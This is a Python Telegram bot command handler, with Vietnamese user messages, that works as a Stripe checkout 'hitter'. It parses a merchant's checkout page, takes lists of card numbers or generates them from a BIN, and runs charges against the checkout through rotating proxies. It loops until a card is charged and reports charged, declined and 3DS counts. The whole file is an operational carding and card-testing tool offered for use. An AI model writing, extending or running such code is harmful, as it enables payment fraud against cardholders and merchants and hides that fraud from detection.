# -*- coding: utf-8 -*-
"""Stripe checkout parse + charge with proxy + BIN gen.
/co url               – Parse checkout
/co url cc|mm|yy|cvv  – Charge 1 card
/co url bin BIN [n]   – Gen cards from BIN and hit
Proxy from /addproxy is auto-used.
"""
import time
from aiogram import Router
from aiogram.types import Message
from aiogram.filters import Command
from aiogram.enums import ParseMode

from card_utils import parse_cards
from bin_gen import generate_cards_from_bin
from hitter.checkout_parse import extract_checkout_url, get_checkout_info
from hitter.stripe_charge import charge_card
from proxy_manager import get_random_proxy_url

router = Router()

def _sym(c: str) -> str:
    return {"USD": "$", "EUR": "€", "GBP": "£", "INR": "₹", "JPY": "¥"}.get(c, "")

@router.message(Command("co"))
async def cmd_co(msg: Message):
    text = (msg.text or "").strip()
    parts = text.split(maxsplit=3)
    uid = msg.from_user.id

    if len(parts) < 2:
        await msg.answer(
            "Cách dùng:\n"
            "• <code>/co &lt;url_stripe&gt;</code> – Parse checkout\n"
            "• <code>/co &lt;url&gt; cc|mm|yy|cvv</code> – Charge 1 thẻ\n"
            "• <code>/co &lt;url&gt; bin &lt;BIN&gt; [số_lượng]</code> – Hit thẻ gen từ BIN\n\n"
            "Proxy tự dùng từ /addproxy (nếu có).",
            parse_mode=ParseMode.HTML,
        )
        return

    url = extract_checkout_url(parts[1]) or parts[1].strip()
    cards = []
    bin_mode = False

    if len(parts) >= 3:
        if parts[2].lower() == "bin" and len(parts) >= 4:
            bin_mode = True
            sp = parts[3].strip().split()
            bin_value = sp[0]
            bin_count = min(int(sp[1]), 50) if len(sp) >= 2 and sp[1].isdigit() else 1
            cards = [
                {"cc": c["cc"], "mm": c["mm"], "yy": c["yy"], "cvv": c["cvv"]}
                for c in generate_cards_from_bin(bin_value, bin_count)
            ]
        else:
            rest = " ".join(parts[2:])
            if msg.reply_to_message and getattr(msg.reply_to_message, "document", None):
                doc = msg.reply_to_message.document
                if doc.file_name and doc.file_name.endswith(".txt"):
                    try:
                        f = await msg.bot.get_file(doc.file_id)
                        data = await msg.bot.download_file(f.file_path)
                        rest = data.read().decode("utf-8", errors="replace")
                    except Exception:
                        pass
            cards = parse_cards(rest)

    proxy_url = get_random_proxy_url(uid)
    proxy_label = "Proxy: ON" if proxy_url else "No proxy"

    status_msg = await msg.answer(f"⏳ Parsing checkout... ({proxy_label})")
    checkout = await get_checkout_info(url, proxy_url=proxy_url)

    if checkout.get("error"):
        await status_msg.edit_text(f"❌ Lỗi: {checkout['error']}")
        return

    price = checkout.get("price") or 0
    currency = checkout.get("currency") or "USD"
    price_str = f"{_sym(currency)}{price:.2f} {currency}"

    if not cards:
        info_lines = [
            f"✅ <b>Checkout</b> {price_str}",
            f"🏪 Merchant: {checkout.get('merchant') or 'N/A'}",
            f"📦 Product: {checkout.get('product') or 'N/A'}",
            f"🌍 Country: {checkout.get('country') or 'N/A'}",
            f"📋 Mode: {checkout.get('mode') or 'N/A'}",
        ]
        if checkout.get("cards_accepted"):
            info_lines.append(f"💳 Cards: {checkout['cards_accepted']}")
        if checkout.get("customer_email"):
            info_lines.append(f"📧 Email: {checkout['customer_email']}")
        info_lines.append(f"🔑 PK: <code>{(checkout.get('pk') or '')[:24]}...</code>")
        info_lines.append(f"🎫 CS: <code>{checkout.get('cs') or ''}</code>")
        info_lines.append(f"🔌 {proxy_label}")
        await status_msg.edit_text("\n".join(info_lines), parse_mode=ParseMode.HTML)
        return

    mode_str = "BIN gen" if bin_mode else "CC list"
    await status_msg.edit_text(
        f"🔄 Charging {price_str} – {len(cards)} thẻ ({mode_str})\n🔌 {proxy_label}"
    )

    start = time.perf_counter()
    results = []
    charged_one = None

    for i, card in enumerate(cards):
        r = await charge_card(card, checkout, proxy_url=proxy_url)
        results.append(r)
        if r["status"] == "CHARGED":
            charged_one = r
            break
        if len(cards) > 3 and (i + 1) % 5 == 0:
            charged_n = sum(1 for x in results if x["status"] == "CHARGED")
            declined_n = sum(1 for x in results if x["status"] == "DECLINED")
            try:
                await status_msg.edit_text(
                    f"🔄 {i+1}/{len(cards)} – {price_str}\n"
                    f"✅ {charged_n} | ❌ {declined_n} | 🔌 {proxy_label}"
                )
            except Exception:
                pass

    total_time = round(time.perf_counter() - start, 2)
    charged_n = sum(1 for x in results if x["status"] == "CHARGED")
    declined_n = sum(1 for x in results if x["status"] == "DECLINED")
    three_ds = sum(1 for x in results if x["status"] == "3DS")
    errors = sum(1 for x in results if x["status"] in ("ERROR", "FAILED"))

    if charged_one:
        out = (
            f"🟢 <b>CHARGED</b> {price_str}\n"
            f"💳 <code>{charged_one['card']}</code>\n"
            f"🏪 {checkout.get('merchant') or 'N/A'}\n"
            f"⏱ {charged_one['time']}s | Tổng {total_time}s\n"
            f"📊 Thử: {len(results)} | ✅ {charged_n} | ❌ {declined_n} | 🔐 {three_ds}\n"
            f"🔌 {proxy_label}"
        )
    else:
        out = (
            f"📊 <b>Kết quả</b> {price_str}\n"
            f"🏪 {checkout.get('merchant') or 'N/A'}\n"
            f"Thử: {len(results)} | ✅ {charged_n} | ❌ {declined_n} | 🔐 {three_ds}"
        )
        if errors:
            out += f" | ⚠️ {errors}"
        out += f"\n⏱ {total_time}s | 🔌 {proxy_label}"
        if results:
            r = results[-1]
            out += f"\n\nCuối: <code>{r['card']}</code>\n{r['status']}: {r['response']}"

    await status_msg.edit_text(out, parse_mode=ParseMode.HTML)
